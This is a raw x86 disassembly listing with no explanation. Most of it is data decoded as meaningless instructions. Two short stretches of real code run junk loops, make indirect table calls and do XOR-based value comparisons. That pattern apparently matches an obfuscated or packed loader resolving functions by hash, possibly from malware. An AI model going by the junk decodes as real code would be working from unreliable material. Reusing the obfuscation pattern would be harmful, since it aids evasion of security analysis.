  413956:	mov    ebp,0x4f4f7b1c
  41395b:	add    al,0x14
  41395d:	or     eax,0x59e243fd
  413962:	add    ebx,ebx
  413964:	pusha  
  413965:	inc    edi
  413966:	push   ss
  413967:	jae    0x413931
  413969:	shl    ecx,cl
  41396b:	jno    0x4138ed
  41396d:	in     al,0xe9
  41396f:	test   eax,0x86da7f26
  413974:	imul   esi,DWORD PTR [ebx-0x49],0x1cfabc1a
  41397b:	popf   
  41397c:	shld   DWORD PTR [edx+0x175249e0],ecx,0x5d
  413984:	push   ebx
  413985:	cmp    ebp,edx
  413987:	sub    eax,0x728c50c6
  41398c:	jns    0x413957
  41398e:	rcl    BYTE PTR ds:0x8214aa14,cl
  413994:	mov    al,0x3
  413996:	xchg   esp,eax
  413997:	xchg   DWORD PTR [ecx],edi
  413999:	mov    eax,ds:0x6f904099
  41399e:	or     ebx,DWORD PTR [edx+edx*1+0x5ee35c76]
  4139a5:	stos   DWORD PTR es:[edi],eax
  4139a6:	aad    0x59
  4139a8:	xor    al,0x79
  4139aa:	call   0x46e6:0x733f525
  4139b1:	cmp    esp,ebp
  4139b3:	cs repnz dec esi
  4139b6:	sbb    DWORD PTR [ecx+0x473d72c6],ebx
  4139bc:	mov    ds:0xe43b4a8f,al
  4139c1:	lds    ebx,FWORD PTR [edx+0x51b8fe32]
  4139c7:	aas    
  4139c8:	cdq    
  4139c9:	adc    al,0xf2
  4139cb:	scas   eax,DWORD PTR es:[edi]
  4139cc:	jo     0x41398e
  4139ce:	mov    bh,0x23
  4139d0:	adc    edi,edx
  4139d2:	mov    al,ds:0xb7047638
  4139d7:	call   0x74aa1a57
  4139dc:	add    al,0xc1
  4139de:	out    0x1f,al
  4139e0:	retf   0xee0b
  4139e3:	addr16 pop ss
  4139e5:	dec    edx
  4139e6:	dec    eax
  4139e7:	test   al,0xd7
  4139e9:	jp     0x413a52
  4139eb:	not    DWORD PTR fs:[edx+0x6a]
  4139ef:	sbb    eax,edx
  4139f1:	nop
  4139f2:	je     0x413983
  4139f4:	xchg   edx,eax
  4139f5:	out    dx,al
  4139f6:	pusha  
  4139f7:	inc    esi
  4139f8:	cdq    
  4139f9:	sub    eax,0x8661fec2
  4139fe:	sbb    esi,DWORD PTR ds:0x5b743b81
  413a04:	jmp    0x413a08
  413a06:	lea    edi,[esi+0x39]
  413a09:	or     ebp,ecx
  413a0b:	xchg   ecx,eax
  413a0c:	sub    DWORD PTR [esi+0x5c876c68],eax
  413a12:	es pusha 
  413a14:	push   edi
  413a15:	push   edx
  413a16:	jecxz  0x413a48
  413a18:	aad    0x34
  413a1a:	jmp    0x413a45
  413a1c:	mov    al,0x29
  413a1e:	xchg   ebp,eax
  413a1f:	addr16 test bh,dh
  413a22:	cmp    al,0x86
  413a24:	data16 and al,ch
  413a27:	repnz dec esi
  413a29:	test   al,0x78
  413a2b:	fldcw  WORD PTR [ecx]
  413a2d:	cmp    ah,BYTE PTR [esi+0x3]
  413a30:	adc    BYTE PTR [edi+0x35fedf68],ah
  413a36:	mov    ch,0x1a
  413a38:	mov    fs,WORD PTR [esi-0x7]
  413a3b:	test   BYTE PTR [eax-0x29],cl
  413a3e:	add    eax,0xf30da56f
  413a43:	jo     0x413a79
  413a45:	in     al,0xaf
  413a47:	lods   al,BYTE PTR ds:[esi]
  413a48:	add    DWORD PTR [ecx],esi
  413a4a:	pop    esi
  413a4b:	sbb    BYTE PTR [edx+0x31416b07],dh
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	or     BYTE PTR [ebx+0x687e319d],0x70
  413a6e:	jo     0x413a29
  413a70:	jle    0x413ae2
  413a72:	jo     0x413a63
  413a74:	pop    edx
  413a75:	cdq    
  413a76:	jnp    0x413a90
  413a78:	mov    ds:0x24a4e00e,eax
  413a7d:	xchg   edx,eax
  413a7e:	xchg   ebp,eax
  413a7f:	sbb    eax,0x508df352
  413a84:	stos   BYTE PTR es:[edi],al
  413a85:	xchg   ecx,eax
  413a86:	xchg   edi,eax
  413a87:	mov    al,ds:0xeeea6cf9
  413a8c:	mov    ah,0x5d
  413a8e:	nop
  413a8f:	imul   ebp,ebp,0xffffff9e
  413a92:	push   ss
  413a93:	sbb    BYTE PTR [ecx],al
  413a95:	xchg   esi,eax
  413a96:	jle    0x413a62
  413a98:	sbb    DWORD PTR [esp+eax*2],0x60
  413a9c:	inc    esp
  413a9d:	jbe    0x413a83
  413a9f:	mov    ebx,0xfcf9711b
  413aa4:	adc    BYTE PTR cs:[esi],al
  413aa7:	push   edi
  413aa8:	pop    ecx
  413aa9:	and    eax,0xdd366ada
  413aae:	and    BYTE PTR [edx+0x31],bh
  413ab1:	rcl    DWORD PTR [eax],0x3f
  413ab4:	dec    ecx
  413ab5:	sbb    eax,0x8d360a37
  413aba:	pop    edi
  413abb:	lods   al,BYTE PTR ds:[esi]
  413abc:	xchg   edx,eax
  413abd:	and    cl,BYTE PTR [esi+ebp*2-0x6147ed11]
  413ac4:	adc    dh,ch
  413ac6:	adc    esi,esp
  413ac8:	int3   
  413ac9:	and    al,0xad
  413acb:	jp     0x413b42
  413acd:	jle    0x413b0e
  413acf:	xor    cl,BYTE PTR [edx+0x1c]
  413ad2:	outs   dx,DWORD PTR ds:[esi]
  413ad3:	pop    ss
  413ad4:	ss aam 0xc5
  413ad7:	and    al,0x2f
  413ad9:	lods   eax,DWORD PTR ds:[esi]
  413ada:	iret   
  413adb:	dec    ebp
  413adc:	push   0xffffffa7
  413ade:	arpl   WORD PTR [esp+esi*1],dx
  413ae1:	pop    edi
  413ae2:	dec    ebx
  413ae3:	push   ecx
  413ae4:	daa    
  413ae5:	stos   DWORD PTR es:[edi],eax
  413ae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ae7:	pop    ebx
  413ae8:	mov    ds:0xe8182d93,eax
  413aed:	fwait
  413aee:	inc    edx
  413aef:	pushf  
  413af0:	leave  
  413af1:	mov    ebx,0xe0d7fc86
  413af6:	cmp    dh,BYTE PTR [esi+0x1e0ec3cb]
  413afc:	adc    edx,DWORD PTR [eax+0x8c73d16]
  413b02:	lock mov dh,0x18
  413b05:	sbb    DWORD PTR [ebp-0x3b],0x11
  413b09:	test   edx,esp
  413b0b:	pop    eax
  413b0c:	test   DWORD PTR [edx+0x71b97d64],eax
  413b12:	ins    BYTE PTR es:[edi],dx
  413b13:	mov    ebp,0x18850fda
  413b18:	aaa    
  413b19:	cmp    edx,0x52
  413b1c:	jmp    FWORD PTR [ebp+eiz*4-0x4a]
  413b20:	aam    0xeb
  413b22:	jge    0x413b3c
  413b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b25:	xor    edi,DWORD PTR [ebp+ebx*1+0x77]
  413b29:	push   esi
  413b2a:	(bad)  
  413b2b:	loopne 0x413b29
  413b2d:	jne    0x413baa
  413b2f:	push   eax
  413b30:	sbb    ah,ah
  413b32:	ins    DWORD PTR es:[edi],dx
  413b33:	push   edi
  413b34:	inc    ebx
  413b35:	adc    al,0x1b
  413b37:	in     eax,0x8e
  413b39:	fsqrt  
  413b3b:	sbb    eax,0xfa69adef
  413b40:	sti    
  413b41:	mov    ah,0xd5
  413b43:	cmp    DWORD PTR [ebp-0x700c5c2c],eax
  413b49:	cwde   
  413b4a:	push   0x2ea43272
  413b4f:	and    DWORD PTR [eax-0x3909752f],0x33b11ac9
  413b59:	mov    WORD PTR [esi-0x48d0d6a4],ss
  413b5f:	or     al,0x27
  413b61:	out    dx,al
  413b62:	push   ecx
  413b63:	inc    ebp
  413b64:	outs   dx,DWORD PTR ds:[esi]
  413b65:	lods   al,BYTE PTR ds:[esi]
  413b66:	les    ecx,FWORD PTR [ebp+0x4d342f11]
  413b6c:	sub    DWORD PTR [edx+0x70],edi
  413b6f:	or     eax,0xb814e30
  413b74:	clc    
  413b75:	mov    eax,0x24ff192c
  413b7a:	sar    BYTE PTR [edi],1
  413b7c:	mov    DWORD PTR [eax+0xcd6ecbb],ebp
  413b82:	scas   eax,DWORD PTR es:[edi]
  413b83:	test   eax,0x78d6c154
  413b88:	sub    BYTE PTR [ecx+0x22b022cd],ah
  413b8e:	(bad)  
  413b8f:	aad    0xdf
  413b91:	mov    esi,0xd6055990
  413b96:	push   ds
  413b97:	lds    ebx,FWORD PTR [edi+0x2eb2bd4]
  413b9d:	and    al,0x44
  413b9f:	mov    ch,0xf3
  413ba1:	cmp    eax,0x872744a0
  413ba6:	cld    
  413ba7:	je     0x413b78
  413ba9:	and    BYTE PTR [ecx+ebx*2-0x7a],al
  413bad:	into   
  413bae:	ds jno 0x413c29
  413bb1:	cmp    ch,dh
  413bb3:	loope  0x413b8d
  413bb5:	test   al,0x7c
  413bb7:	mov    bh,BYTE PTR [edx+0x7242bc9]
  413bbd:	mov    esi,esi
  413bbf:	mov    dl,0x77
  413bc1:	add    ebp,DWORD PTR [edx+eiz*8+0x4695f351]
  413bc8:	mov    ds:0xc124f9e7,al
  413bcd:	neg    BYTE PTR [ecx]
  413bcf:	pop    ecx
  413bd0:	and    BYTE PTR es:0xd8be50e5,al
  413bd7:	das    
  413bd8:	ds dec ecx
  413bda:	imul   ecx,DWORD PTR [edi+0x35],0x39
  413bde:	pop    edi
  413bdf:	fldenv [ecx+0x2b]
  413be2:	mov    ebp,0xf27cf0e
  413be7:	mov    ah,0x5a
  413be9:	hlt    
  413bea:	push   esp
  413beb:	cmp    al,0xeb
  413bed:	dec    edx
  413bee:	dec    ecx
  413bef:	mov    ch,0x5f
  413bf1:	fild   QWORD PTR [edi-0x75]
  413bf4:	sbb    ch,bl
  413bf6:	xlat   BYTE PTR ds:[ebx]
  413bf7:	out    dx,al
  413bf8:	sbb    DWORD PTR [ebp-0x68],0xa35f26f9
  413bff:	cmc    
  413c00:	push   esp
  413c01:	sub    al,BYTE PTR [edx+0x3f]
  413c04:	xchg   BYTE PTR [esi+0x2bcf1021],ch
  413c0a:	inc    esp
  413c0b:	and    al,0x47
  413c0d:	inc    edi
  413c0e:	and    eax,0x78ad82f8
  413c13:	in     al,0xed
  413c15:	cmp    cl,BYTE PTR ds:0x2a7d774c
  413c1b:	mov    ds:0xb6d503ca,al
  413c20:	pushf  
  413c21:	jne    0x413c02
  413c23:	add    edi,eax
  413c25:	mov    ebp,0xf2870ce8
  413c2a:	mov    edi,edx
  413c2c:	(bad)  
  413c2d:	stc    
  413c2e:	inc    esi
  413c2f:	ja     0x413c60
  413c31:	ret    0xd4aa
  413c34:	cli    
  413c35:	lea    ecx,[ecx-0x51da1011]
  413c3b:	int    0x8b
  413c3d:	lea    ebp,[ebx-0x7b9b393d]
  413c43:	sbb    al,0x32
  413c45:	and    eax,0x250b9fdf
  413c4a:	imul   edi,ebp,0x8b0accde
  413c50:	mov    esi,0xd33858af
  413c55:	sub    dh,BYTE PTR ds:0xf4db5872
  413c5b:	and    BYTE PTR [esi+0x65],dh
  413c5e:	rol    BYTE PTR [eax],cl
  413c60:	push   esi
  413c61:	mov    eax,ds:0x95f3cdc8
  413c66:	cmp    edx,DWORD PTR [esi]
  413c68:	ins    BYTE PTR es:[edi],dx
  413c69:	dec    esi
  413c6a:	inc    ecx
  413c6b:	or     bl,ah
  413c6d:	jb     0x413c7e
  413c6f:	mov    WORD PTR [ebp-0x65],ds
  413c72:	loope  0x413cca
  413c74:	sahf   
  413c75:	jmp    0xc63d:0xdd465e9d
  413c7c:	xor    al,0x42
  413c7e:	repz sub DWORD PTR ds:0x9d09c008,ebx
  413c85:	xchg   ebx,eax
  413c86:	mov    al,0x47
  413c88:	mov    ds:0xaa271cc9,eax
  413c8d:	in     al,dx
  413c8e:	shr    BYTE PTR [esi+eax*4+0x3e],1
  413c92:	push   esp
  413c93:	or     al,0xc5
  413c95:	out    0x86,eax
  413c97:	and    al,0x42
  413c99:	xor    BYTE PTR ss:[esi],bh
  413c9c:	cmp    DWORD PTR [esi-0x32],edx
  413c9f:	clc    
  413ca0:	fwait
  413ca1:	dec    eax
  413ca2:	pusha  
  413ca3:	rcr    BYTE PTR [ecx+edx*8],cl
  413ca6:	rcl    DWORD PTR [esi],1
  413ca8:	fistp  DWORD PTR [edx+0x77]
  413cab:	test   eax,0xb8a9c72e
  413cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cb1:	dec    DWORD PTR gs:[eax-0x5487b2c1]
  413cb8:	rol    BYTE PTR [ecx-0x40b646dd],1
  413cbe:	and    esi,edi
  413cc0:	mov    cl,BYTE PTR [ecx+0x3a]
  413cc3:	call   0xa80afd1e
  413cc8:	and    eax,0xe54b8d13
  413ccd:	nop
  413cce:	js     0x413cfe
  413cd0:	mov    ebp,0x1c9fd566
  413cd5:	scas   eax,DWORD PTR es:[edi]
  413cd6:	sub    DWORD PTR [esi*8+0x7f154043],edx
  413cdd:	loopne 0x413cbb
  413cdf:	adc    dh,BYTE PTR [eax]
  413ce1:	pop    ebx
  413ce2:	mov    ebp,0xce0ff06e
  413ce7:	inc    ecx
  413ce8:	jge    0x413d0e
  413cea:	jnp    0x413ce0
  413cec:	add    BYTE PTR [ecx+edi*1-0x19],dl
  413cf0:	cmp    ecx,ebp
  413cf2:	data16 std 
  413cf4:	jbe    0x413c84
  413cf6:	int    0x89
  413cf8:	rcr    BYTE PTR [esi],1
  413cfa:	inc    ebx
  413cfb:	out    dx,al
  413cfc:	cmc    
  413cfd:	mov    dh,0x81
  413cff:	lods   eax,DWORD PTR ds:[esi]
  413d00:	nop
  413d01:	repnz xchg ebx,eax
  413d03:	js     0x413cc8
  413d05:	sbb    al,0x77
  413d07:	and    BYTE PTR [edx+0x3b5526e],dh
  413d0d:	add    esp,edi
  413d0f:	fwait
  413d10:	lahf   
  413d11:	das    
  413d12:	aam    0xf2
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	hlt    
  413d16:	or     al,0x54
  413d18:	push   cs
  413d19:	stos   BYTE PTR es:[edi],al
  413d1a:	push   eax
  413d1b:	loop   0x413d93
  413d1d:	popa   
  413d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d1f:	int3   
  413d20:	sub    edi,DWORD PTR [eax+0xf375cc8]
  413d26:	dec    ebx
  413d27:	jmp    0x14a2eef8
  413d2c:	pop    ds
  413d2d:	and    al,0xaf
  413d2f:	sbb    BYTE PTR [esi],ah
  413d31:	jge    0x413d73
  413d33:	mov    eax,ds:0x707de437
  413d38:	add    DWORD PTR [esi-0x741fba77],ebx
  413d3e:	inc    ebp
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	(bad)  
  413e8c:	ins    DWORD PTR es:[edi],dx
  413e8d:	jecxz  0x413e7b
  413e8f:	inc    edi
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413ed0
  413e98:	dec    edx
  413e99:	repz dec edx
  413e9b:	push   esi
  413e9c:	ds test al,dh
  413e9f:	mov    esp,0xdef25c98
  413ea4:	add    BYTE PTR [edx+0x2ffc952d],bl
  413eaa:	mov    ecx,0x481f1aae
  413eaf:	or     cl,bh
  413eb1:	or     eax,0x4ede0f54
  413eb6:	call   0x1fe0:0xe0fee57d
  413ebd:	mov    ?,eax
  413ebf:	pop    esp
  413ec0:	retf   
  413ec1:	adc    edi,DWORD PTR [ecx]
  413ec3:	addr16 nop
  413ec5:	push   ebp
  413ec6:	in     al,0xc6
  413ec8:	and    DWORD PTR [eax],edx
  413eca:	jp     0x413ee8
  413ecc:	popa   
  413ecd:	(bad)  
  413ece:	xchg   esp,eax
  413ecf:	imul   edi,DWORD PTR [eax+0x2a],0x5b5134e4
  413ed6:	add    eax,0x5cf8aec7
  413edb:	push   ecx
  413edc:	out    dx,eax
  413edd:	sbb    eax,0x79e3e1d7
  413ee2:	add    ebx,DWORD PTR [ebp+0x7c0ce3ff]
  413ee8:	js     0x413ec4
  413eea:	sub    eax,0x60bc0a78
  413eef:	push   0x59
  413ef1:	imul   BYTE PTR [edx+0x1f]
  413ef4:	sbb    DWORD PTR [ecx-0x2c],esi
  413ef7:	(bad)  
  413ef8:	test   BYTE PTR [esi],0xb2
  413efb:	mov    al,0x64
  413efd:	call   0x6e3dbe6f
  413f02:	dec    ebx
  413f03:	pop    ds
  413f04:	xor    al,0x92
  413f06:	add    eax,0x1b5396b9
  413f0b:	mov    bh,BYTE PTR cs:[eax]
  413f0e:	and    al,0x2
  413f10:	push   eax
  413f11:	jb     0x413ee0
  413f13:	push   esp
  413f14:	fxam   
  413f16:	call   0xcfdd:0xae3a916a
  413f1d:	(bad)  
  413f1e:	hlt    
  413f1f:	xor    eax,0x6
  413f22:	mov    BYTE PTR [edx],0x7e
  413f25:	ret    
  413f26:	jo     0x413f81
  413f28:	xor    al,0x60
  413f2a:	je     0x413f79
  413f2c:	pop    ss
  413f2d:	xchg   BYTE PTR [eax-0x29],bl
  413f30:	adc    BYTE PTR [ebp+0x78],bl
  413f33:	jle    0x413f10
  413f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f36:	adc    bh,ah
  413f38:	adc    edi,DWORD PTR [ebx]
  413f3a:	pop    ebx
  413f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f3c:	inc    ebp
  413f3d:	out    dx,al
  413f3e:	(bad)  [esi]
  413f40:	push   ebp
  413f41:	pusha  
  413f42:	sbb    bh,ch
  413f44:	clc    
  413f45:	push   0xb69a594c
  413f4a:	stos   BYTE PTR es:[edi],al
  413f4b:	into   
  413f4c:	test   eax,0xf6063458
  413f51:	inc    ebp
  413f52:	retf   0x20af
  413f55:	adc    al,0xf3
  413f57:	cmp    dh,cl
  413f59:	xchg   esi,eax
  413f5a:	ret    0x32a8
  413f5d:	fcom   DWORD PTR [ecx+0xf]
  413f60:	lds    esp,FWORD PTR [edi+0x21]
  413f63:	sbb    al,0xb8
  413f65:	jecxz  0x413f57
  413f67:	push   ebp
  413f68:	lods   al,BYTE PTR ds:[esi]
  413f69:	aad    0xb5
  413f6b:	push   eax
  413f6c:	mov    esp,0xee3b3085
  413f71:	inc    ebp
  413f72:	nop
  413f73:	push   eax
  413f74:	ret    0xaebc
  413f77:	or     al,0x2f
  413f79:	pushf  
  413f7a:	dec    ebp
  413f7b:	cmp    BYTE PTR [ecx-0x453c102],bh
  413f81:	aaa    
  413f82:	jns    0x413fd4
  413f84:	mov    ds:0x94b7fcb5,al
  413f89:	pusha  
  413f8a:	and    eax,0x9e4fdcba
  413f8f:	pusha  
  413f90:	lds    edi,FWORD PTR [esi+0x6c]
  413f93:	test   al,0xa0
  413f95:	(bad)  
  413f96:	cmp    ah,BYTE PTR [edx+eiz*2-0x1a]
  413f9a:	inc    edx
  413f9b:	adc    al,0x6a
  413f9d:	imul   edi,DWORD PTR [edi-0x59a53fc0],0x5d4e3bfd
  413fa7:	dec    edx
  413fa8:	and    eax,0xb14420c9
  413fad:	fs dec ecx
  413faf:	shr    BYTE PTR [edx+ebx*8+0x149ab589],1
  413fb6:	in     eax,dx
  413fb7:	pop    esi
  413fb8:	arpl   WORD PTR [edi+0x12],dx
  413fbb:	pop    ecx
  413fbc:	lea    ebp,[edx+edi*4]
  413fbf:	stc    
  413fc0:	fdiv   QWORD PTR [ecx+0x4e]
  413fc3:	lods   eax,DWORD PTR ds:[esi]
  413fc4:	loopne 0x413f5f
  413fc6:	lods   eax,DWORD PTR ds:[esi]
  413fc7:	data16 jne 0x41401c
  413fca:	loopne 0x413f81
  413fcc:	enter  0xda9b,0x16
  413fd0:	or     bh,dh
  413fd2:	imul   esp,DWORD PTR [ebx+0x6f],0xbc18bd9f
  413fd9:	lods   al,BYTE PTR ds:[esi]
  413fda:	(bad)  
  413fdb:	adc    ch,ch
  413fdd:	clc    
  413fde:	push   0x1c
  413fe0:	lahf   
  413fe1:	sub    ebx,eax
  413fe3:	leave  
  413fe4:	aam    0x2
  413fe6:	dec    edx
  413fe7:	jmp    0xff94:0xaa744727
  413fee:	dec    ebx
  413fef:	add    al,0xad
  413ff1:	stc    
  413ff2:	add    ecx,ebp
  413ff4:	sbb    bh,BYTE PTR [ecx+0x6b22dea3]
  413ffa:	lods   al,BYTE PTR ds:[esi]
  413ffb:	mov    eax,ds:0xd714d12a
  414000:	rcl    BYTE PTR [ecx+0x5e0e3c96],cl
  414006:	mov    ?,WORD PTR [esi+0x62]
  414009:	dec    ebp
  41400a:	mov    ds:0x29aff119,eax
  41400f:	jp     0x414013
  414011:	push   esp
  414012:	inc    ebp
  414013:	fisttp DWORD PTR [ebx-0x1a]
  414016:	mov    bh,0xc5
  414018:	hlt    
  414019:	push   cs
  41401a:	jle    0x413fa8
  41401c:	add    eax,0x64cad723
  414021:	(bad)
  414025:	jne    0x41402d
  414027:	mov    eax,DWORD PTR [ebp+0x34b5678]
  41402d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41402e:	inc    eax
  41402f:	xor    eax,0x341658a5
  414034:	addr16 push esp
  414036:	out    dx,al
  414037:	test   BYTE PTR [ebx+0x24c3b1],0x86
  41403e:	cmp    DWORD PTR [edi+0x49],esp
  414041:	loop   0x414033
  414043:	(bad)  
  414044:	inc    eax
  414045:	cmc    
  414046:	and    eax,0x5d93e9ac
  41404b:	or     al,BYTE PTR [eax+ebp*1]
  41404e:	js     0x4140a0
  414050:	(bad)  
  414051:	jl     0x4140c0
  414053:	out    0x5b,al
  414055:	jns    0x4140b1
  414057:	sub    bl,al
  414059:	inc    ebp
  41405a:	mul    DWORD PTR [ecx]
  41405c:	adc    BYTE PTR [eax+eiz*8-0x6c],cl
  414060:	dec    ebp
  414061:	nop
  414062:	cld    
  414063:	daa    
  414064:	je     0x414045
  414066:	ds or  edi,ebx
  414069:	sbb    cl,0xf7
  41406c:	js     0x4140b7
  41406e:	jne    0x414035
  414070:	sbb    eax,0x2aa34a77
  414075:	sbb    esp,DWORD PTR [ebx-0x6d]
  414078:	mov    ecx,DWORD PTR [eax+0x4fb6ef5e]
  41407e:	ja     0x414068
  414080:	jae    0x414065
  414082:	div    dh
  414084:	mov    DWORD PTR [edx-0x2c],eax
  414087:	pop    ebp
  414088:	xchg   ebx,eax
  414089:	in     al,0x7a
  41408b:	cmp    eax,0x492d2bbb
  414090:	xlat   BYTE PTR ds:[ebx]
  414091:	test   ecx,edx
  414093:	call   DWORD PTR [ebp+edx*2+0x55c4bcf6]
  41409a:	aaa    
  41409b:	xchg   ebx,eax
  41409c:	arpl   sp,sp
  41409e:	push   ds
  41409f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140a0:	pop    ebp
  4140a1:	adc    ah,bh
  4140a3:	push   esi
  4140a4:	call   0xeeebc568
  4140a9:	and    eax,0x4c13b4fd
  4140ae:	pop    edi
  4140af:	mov    al,0xc0
  4140b1:	vcmpps xmm0,xmm4,xmm1,0xdb
  4140b6:	inc    ebx
  4140b7:	mov    ds:0x5fc38415,al
  4140bc:	mov    esp,edx
  4140be:	push   edi
  4140bf:	or     cl,BYTE PTR [edx+eiz*4-0x54]
  4140c3:	push   0x6a96fed3
  4140c8:	dec    esp
  4140c9:	ror    BYTE PTR [edi-0x282dc7b8],0xa6
  4140d0:	adc    al,0xf4
  4140d2:	mov    esi,0x7a514504
  4140d7:	int    0xa2
  4140d9:	lahf   
  4140da:	mov    dh,0x2c
  4140dc:	out    0xe3,al
  4140de:	outs   dx,BYTE PTR ds:[esi]
  4140df:	stos   BYTE PTR es:[edi],al
  4140e0:	adc    ah,BYTE PTR [esi+0x290712d2]
  4140e6:	or     eax,0x2ca226df
  4140eb:	pcmpeqd mm0,QWORD PTR [ebx]
  4140ee:	sahf   
  4140ef:	fucomp st(7)
  4140f1:	sbb    ebx,edi
  4140f3:	xlat   BYTE PTR ds:[ebx]
  4140f4:	ja     0x4140e7
  4140f6:	cmp    eax,0x65c1c9e2
  4140fb:	add    edi,edx
  4140fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140fe:	mov    ds:0x127b56c2,eax
  414103:	pusha  
  414104:	in     al,dx
  414105:	arpl   WORD PTR [ebx+edi*8-0x50],ax
  414109:	mov    cs,WORD PTR [ebx]
  41410b:	bound  edx,QWORD PTR [ebx+0x238994c8]
  414111:	dec    ecx
  414112:	scas   al,BYTE PTR es:[edi]
  414113:	test   DWORD PTR [eax+0x75],edi
  414116:	cwde   
  414117:	jl     0x41414e
  414119:	loopne 0x414102
  41411b:	test   BYTE PTR [ebx+eax*1-0x3e],cl
  41411f:	cmp    eax,0xa2c9f9ce
  414124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414125:	ds (bad) 
  414127:	lods   eax,DWORD PTR ds:[esi]
  414128:	mov    BYTE PTR [esi+0x6e],ah
  41412b:	aas    
  41412c:	jo     0x4141a2
  41412e:	cs int3 
  414130:	ret    0x7aa
  414133:	sbb    esi,DWORD PTR [ecx]
  414135:	adc    al,0x7
  414137:	xor    esi,eax
  414139:	fwait
  41413a:	adc    BYTE PTR [ebx-0x9],0x6a
  41413e:	loopne 0x41417d
  414140:	mov    cl,0x3b
  414142:	adc    al,0xe7
  414144:	hlt    
  414145:	dec    ecx
  414146:	mov    esi,DWORD PTR [ebp+0x4b]
  414149:	fimul  WORD PTR [ebx]
  41414b:	mov    eax,ds:0xf8e7fadf
  414150:	and    ebp,eax
  414152:	mov    al,ds:0x99d88322
  414157:	enter  0xbb21,0x14
  41415b:	jle    0x414113
  41415d:	push   esi
  41415e:	mov    eax,DWORD PTR [ebp-0x14]
  414161:	and    DWORD PTR ds:0x42fcd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
